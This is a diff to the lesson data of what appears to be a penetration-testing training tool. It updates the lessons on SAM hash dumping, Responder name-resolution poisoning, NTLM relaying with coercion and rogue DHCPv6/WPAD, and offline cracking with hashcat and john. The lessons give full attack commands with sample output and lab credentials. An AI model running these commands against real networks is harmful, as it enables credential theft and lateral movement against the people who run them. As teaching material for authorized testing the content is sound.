@@ -899,7 +899,7 @@
       output: [
         'SMB  10.10.10.10  445  DC01  [+] Dumping SAM hashes',
         'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
-        'svc-backup:1104:aad3b435b51404ee...:7c6a180b36896a0a8c02787eeafb0e4c:::',
+        'svc-backup:1104:aad3b435b51404ee...:f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03:::',
       ].join('\n'),
       signal: 'Administrator:500:aad3b435b51404ee...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
       teach: 'With local admin you can dump the SAM, the local account hashes. The :500 Administrator hash can be passed to other machines (local admins are often reused), and the rest feed cracking. On a DC, --ntds dumps the whole domain.',
@@ -1262,9 +1262,9 @@
 
     // ============================ CREDENTIALS & CRACKING ============================
     'responder-poison': {
-      why: "On a Windows network, when a host cannot resolve a name the normal way it shouts for it over LLMNR, NBT-NS, and mDNS, and Responder answers those shouts, so a user mistyping a share name hands you their NetNTLMv2 hash to crack. It runs entirely on your box and is passive, you catch authentication that comes to you, you send none. Reach for it with a foothold on the segment and no creds yet; it is often the first domain credential you get.",
+      why: "On a Windows network, when a host cannot resolve a name the normal way it shouts for it over LLMNR, NBT-NS, and mDNS, and Responder answers those shouts, so a user mistyping a share name hands you their NetNTLMv2 hash to crack. It runs entirely on your box and is semi-passive: you make no connection to any target, but you do send spoofed LLMNR, NBT-NS, and mDNS replies (that is the poisoning). Reach for it with a foothold on the segment and no creds yet; it is often the first domain credential you get.",
       signal: '[SMB] NTLMv2-SSP Username : ACME\\jdoe',
-      teach: 'Responder runs entirely on YOUR box; there is nothing to install on a target. It is PASSIVE: it only catches authentication that happens to come your way (a user mistyping a share name, so the host broadcasts "who is fileshare?" and Responder answers "me"). On a quiet network you could wait forever, so pair it with a coercion tool (coercer / PetitPotam / PrinterBug) to FORCE a chosen host to authenticate to you. Either way you walk away with a NetNTLMv2 hash to crack or relay.',
+      teach: 'Responder runs entirely on YOUR box; there is nothing to install on a target. It is SEMI-PASSIVE: you start no connection to a target, but you do send spoofed name-resolution replies, and it only catches authentication that comes your way (a user mistyping a share name, so the host broadcasts "who is fileshare?" and Responder answers "me"). On a quiet network you could wait forever, so pair it with a coercion tool (coercer / PetitPotam / PrinterBug) to FORCE a chosen host to authenticate to you. Either way you walk away with a NetNTLMv2 hash to crack or relay.',
       steps: [
         { where: 'local', tool: 'responder', cmd: 'sudo responder -I eth0 -w', output: [
           '[+] Poisoners: LLMNR, NBT-NS, MDNS',
@@ -1284,7 +1284,7 @@
       signal: '[*] Authenticating against smb://10.10.10.20 as ACME/JDOE SUCCEED',
       teach: 'Relaying forwards a captured authentication to a SECOND host instead of cracking it, but ntlmrelayx, like Responder, only relays auth that comes IN to it. So you drive the traffic: coerce a target to authenticate (coercer / PetitPotam), and ntlmrelayx relays that to a machine where the victim is local admin (SMB signing off), dumping its SAM. "SUCCEED" means you are in without ever knowing the password.',
       steps: [
-        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'impacket-ntlmrelayx -tf relay-targets.txt -smb2support', output: '[*] Servers started, waiting for connections' },
+        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'sudo impacket-ntlmrelayx -tf relay-targets.txt -smb2support', output: '[*] Servers started, waiting for connections' },
         { where: 'local', tool: 'coercer', cmd: "coercer coerce -t 10.10.10.50 -l 10.10.14.5 -u jdoe -p 'Autumn2026!' -d acme.internal", output: [
           '[+] 10.10.10.50 coerced to authenticate to 10.10.14.5',
           '↩ relayed by ntlmrelayx:',
@@ -1303,7 +1303,7 @@
           '[*] Sending rogue DHCPv6 replies; spoofing DNS for *.acme.internal',
           '[*] IPv6 address assigned to victim 10.10.10.50',
         ].join('\n') },
-        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'impacket-ntlmrelayx -6 -t ldaps://10.10.10.10 -wh fakewpad.acme.internal -l loot', output: [
+        { where: 'local', tool: 'impacket-ntlmrelayx', cmd: 'sudo impacket-ntlmrelayx -6 -t ldaps://10.10.10.10 -wh fakewpad.acme.internal -l loot', output: [
           '[*] Victim queried WPAD, serving malicious proxy config',
           '[*] Authenticating against ldaps://10.10.10.10 as ACME\\jdoe SUCCEED',
           '[*] Domain info and delegation rights written to loot/',
@@ -1346,10 +1346,10 @@
       cmd: 'hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt', tool: 'hashcat',
       output: [
         '31d6cfe0d16ae931b73c59d7e0c089c0:(empty)',
-        '7c6a180b36896a0a8c02787eeafb0e4c:password1',
+        'f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03:password1',
         'Status...........: Cracked',
       ].join('\n'),
-      signal: '7c6a180b36896a0a8c02787eeafb0e4c:password1',
+      signal: 'f2a4e8c1b9d05e3a7c6f1b2e4d8a9c03:password1',
       teach: 'A dumped NTLM hash (mode 1000) cracks offline. You do not always need to (NTLM can be passed directly), but a recovered cleartext password is reusable on services that will not take a hash (RDP, web, SSH).',
     },
     'crack-netntlmv2': {
@@ -2297,7 +2297,7 @@
       { key: "responder", label: "Responder caught a hash", steps: [
         { title: "Poison and capture", tool: "responder", where: "local", cmd: "sudo responder -I eth0", out: "[SMB] NTLMv2-SSP Hash : jsmith::CORP:1122334455667788:A1B2...", sig: "NTLMv2-SSP Hash", teach: "A NetNTLMv2 capture cannot be passed, so cracking (or relaying) is the only way to use it." } ] },
       { key: "relay", label: "A relay logged a hash it could not use", steps: [
-        { title: "Relay saw signing required", tool: "ntlmrelayx", where: "local", cmd: "sudo impacket-ntlmrelayx -tf targets.txt -smb2support", out: "[-] Signing is required, relay to SMB not possible\n[*] Captured NetNTLMv2: svc_backup", sig: "Captured NetNTLMv2", teach: "Signing blocked the relay, but the hash was logged; cracking it is the fallback." } ] },
+        { title: "Relay saw signing required", tool: "ntlmrelayx", where: "local", cmd: "sudo impacket-ntlmrelayx -tf targets.txt -smb2support", out: "[-] SMB signing is required: relay to SMB not possible", sig: "relay to SMB not possible", teach: "Signing blocked the relay, so crack the NetNTLMv2 hash Responder captured instead." } ] },
     ],
     "crack-shadow": [
       { key: "foothold", label: "You read /etc/shadow as root", steps: [
@@ -2343,16 +2343,16 @@
   // Field notes for the creds lane, every item a playable demo (correct hashcat modes, real tool output).
   var CREDS_HOW = {
     "crack-identify": {"lead":"Before you crack, name the hash: the format decides the tool, the mode, and whether cracking is even the right move.","items":[
-      {"t":"Identify with hashid","d":"hashid matches a hash against known patterns and prints the candidate types with their hashcat modes.","demo":[{"run":"hashid '31d6cfe0d16ae931b73c59d7e0c089c0'","out":"Analyzing '31d6cfe0d16ae931b73c59d7e0c089c0'\n[+] NTLM [Hashcat Mode: 1000]\n[+] MD5","sig":"Hashcat Mode: 1000"}],"note":"A bare 32-hex string is almost always NTLM (mode 1000) in a Windows context."},
+      {"t":"Identify with hashid","d":"hashid matches a hash against known patterns and prints the candidate types with their hashcat modes.","demo":[{"run":"hashid -m '31d6cfe0d16ae931b73c59d7e0c089c0'","out":"Analyzing '31d6cfe0d16ae931b73c59d7e0c089c0'\n[+] NTLM [Hashcat Mode: 1000]\n[+] MD5","sig":"Hashcat Mode: 1000"}],"note":"A bare 32-hex string is almost always NTLM (mode 1000) in a Windows context."},
       {"t":"Recognise the $ prefixes by eye","d":"The prefix is faster than any tool: $krb5tgs$ is Kerberoast (13100), $krb5asrep$ (18200), $6$ sha512crypt (1800), $DCC2$ (2100).","demo":[{"run":"echo '$krb5tgs$23$*svc$CORP$...' | cut -d'$' -f2","out":"krb5tgs","sig":"krb5tgs"}],"note":"krb5tgs means hashcat -m 13100; the prefix alone tells you the mode."},
-      {"t":"Count the fields for NetNTLMv2","d":"A NetNTLMv2 hash is user::DOMAIN:challenge:HMAC:blob, five colon-separated parts; that shape is mode 5600.","demo":[{"run":"awk -F: '{print NF-1\" colons\"}' <<< 'jsmith::CORP:1122:A1B2:0101'","out":"5 colons","sig":"5 colons"}],"note":"The user::DOMAIN: shape is NetNTLMv2 (mode 5600), not a plain NT hash."}]},
+      {"t":"Count the fields for NetNTLMv2","d":"A NetNTLMv2 hash is user::DOMAIN:challenge:HMAC:blob, six colon-separated fields (five colons); that shape is mode 5600.","demo":[{"run":"awk -F: '{print NF-1\" colons\"}' <<< 'jsmith::CORP:1122:A1B2:0101'","out":"5 colons","sig":"5 colons"}],"note":"The user::DOMAIN: shape is NetNTLMv2 (mode 5600), not a plain NT hash."}]},
     "crack-kerberoast": {"lead":"A $krb5tgs$ hash cracks offline to a service account's password, with no traffic to the DC while you grind.","items":[
       {"t":"Crack with hashcat mode 13100","d":"Point hashcat at the TGS hash with a wordlist; service accounts often carry weak, rarely-rotated passwords.","demo":[{"run":"hashcat -m 13100 tgs.hash rockyou.txt","out":"$krb5tgs$23$*svc_sql$CORP.LOCAL$...:Summer2023!\nStatus: Cracked","sig":":Summer2023!"}],"note":"svc_sql's password is Summer2023!; now a real credential to spray and reuse."},
       {"t":"Add a rules file for near-misses","d":"best64 mutates the wordlist (caps, digits, years), catching policy-padded passwords a raw list misses.","demo":[{"run":"hashcat -m 13100 tgs.hash rockyou.txt -r /usr/share/hashcat/rules/best64.rule","out":"Recovered......: 1/1 (100.00%)","sig":"Recovered......: 1/1"}],"note":"Rules turn 'Summer' into 'Summer2023!', which is how most corporate passwords look."},
       {"t":"John the Ripper as the CPU fallback","d":"john with --format=krb5tgs cracks the same hash without a GPU, handy when your box has none.","demo":[{"run":"john --format=krb5tgs --wordlist=rockyou.txt tgs.hash","out":"Summer2023!      (svc_sql)","sig":"(svc_sql)"}],"note":"Same result, CPU-only; john is the fallback when no GPU is available."}]},
     "crack-asrep-offline": {"lead":"An AS-REP hash cracks offline to a pre-auth-disabled user's plaintext, the quietest credential you can get.","items":[
       {"t":"Crack with hashcat mode 18200","d":"The $krb5asrep$ hash is mode 18200; a weak password falls to a wordlist quickly.","demo":[{"run":"hashcat -m 18200 asrep.hash rockyou.txt","out":"$krb5asrep$23$tgibson@CORP.LOCAL:...:Welcome1\nStatus: Cracked","sig":":Welcome1"}],"note":"tgibson's password is Welcome1; a confirmed domain credential with zero auth attempts spent."},
-      {"t":"Match the etype to the mode","d":"etype 23 (RC4) is mode 18200; an AES AS-REP (17/18) needs 19600/19700. Wrong mode, no crack.","demo":[{"run":"hashcat --identify asrep.hash","out":"18200 | Kerberos 5, etype 23, AS-REP","sig":"18200"}],"note":"--identify confirms etype 23 maps to 18200 before you waste time on the wrong mode."},
+      {"t":"Match the etype to the mode","d":"AS-REP in the wild is almost always etype 23 (RC4), which is hashcat mode 18200. If --identify ever shows a different etype, match the mode before wasting a run.","demo":[{"run":"hashcat --identify asrep.hash","out":"18200 | Kerberos 5, etype 23, AS-REP","sig":"18200"}],"note":"--identify confirms etype 23 maps to 18200 before you waste time on the wrong mode."},
       {"t":"Take it hashcat-ready from GetNPUsers","d":"GetNPUsers writes the hash in hashcat format directly, so there is no reformatting before cracking.","demo":[{"run":"impacket-GetNPUsers corp.local/ -usersfile users.txt -no-pass -format hashcat -outputfile asrep.hash","out":"[*] Saving hashes to asrep.hash","sig":"Saving hashes to asrep.hash"}],"note":"-format hashcat means the file drops straight into hashcat -m 18200."}]},
     "crack-ntlm": {"lead":"An NT hash may crack to plaintext you can reuse where a hash cannot go (RDP, web, SSH).","items":[
       {"t":"Crack with hashcat mode 1000","d":"NT hashes are mode 1000 and unsalted, so they crack extremely fast against a wordlist.","demo":[{"run":"hashcat -m 1000 nt.hash rockyou.txt","out":"2b576acbe6bcfda7294d6bd18041b8fe:P@ssw0rd2024\nStatus: Cracked","sig":":P@ssw0rd2024"}],"note":"The local admin password is P@ssw0rd2024; try it on every other host for reuse."},
@@ -2367,7 +2367,7 @@
       {"t":"Crack sha512crypt with mode 1800","d":"$6$ is sha512crypt, hashcat mode 1800; it is slow by design, so a targeted wordlist beats brute force.","demo":[{"run":"hashcat -m 1800 crack.txt rockyou.txt","out":"$6$Xq2$9Zk...:Toor1234\nStatus: Cracked","sig":":Toor1234"}],"note":"root's password is Toor1234; reuse it for su, sudo, or SSH."},
       {"t":"Pick the mode from the prefix","d":"$1$ md5crypt (500), $5$ sha256crypt (7400), $6$ sha512crypt (1800), $y$ yescrypt. The prefix picks the mode.","demo":[{"run":"cut -d: -f2 shadow.txt | cut -c1-3","out":"$6$","sig":"$6$"}],"note":"$6$ means mode 1800; reading the prefix first saves a failed run on the wrong mode."}]},
     "crack-archive": {"lead":"The matching *2john turns a locked archive into a crackable hash; inside is usually the next credential.","items":[
-      {"t":"Extract the hash with zip2john","d":"zip2john reads the encrypted archive and prints a john-format hash of its password.","demo":[{"run":"zip2john backup.zip > zip.hash","out":"backup.zip:$zip2$*0*1*0*abc123...*$/zip2$","sig":"$zip2$"}],"note":"The $zip2$ hash is what you crack; the archive stays locked until you do."},
+      {"t":"Extract the hash with zip2john","d":"zip2john reads the encrypted archive and prints a john-format hash of its password.","demo":[{"run":"zip2john backup.zip > zip.hash","out":"backup.zip:$pkzip2$1*1*2*0*abc123...*$/pkzip2$","sig":"$pkzip2$"}],"note":"The $pkzip2$ hash (legacy ZipCrypto) cracks with hashcat -m 17200; the archive stays locked until you do. A WinZip-AES $zip2$ hash would be -m 13600 instead."},
       {"t":"Crack it and unpack","d":"Crack the hash, then extract with the recovered password and read what was worth hiding.","demo":[{"run":"john --wordlist=rockyou.txt zip.hash","out":"S3cr3tZip        (backup.zip)","sig":"(backup.zip)"}],"note":"S3cr3tZip unlocks it: unzip -P S3cr3tZip backup.zip reveals the contents."},
       {"t":"Match the extractor to the format","d":"zip2john, rar2john, 7z2john, pdf2john, ssh2john: the wrong extractor produces a garbage hash.","demo":[{"run":"7z2john secret.7z | head -c 20","out":"secret.7z:$7z$2$19$","sig":"$7z$"}],"note":"A .7z needs 7z2john; the $7z$ prefix confirms you used the right one."}]},
     "crack-mscache2": {"lead":"A DCC2 blob cracks slowly to a real domain password; worth the wait when it is the only credential you have.","items":[
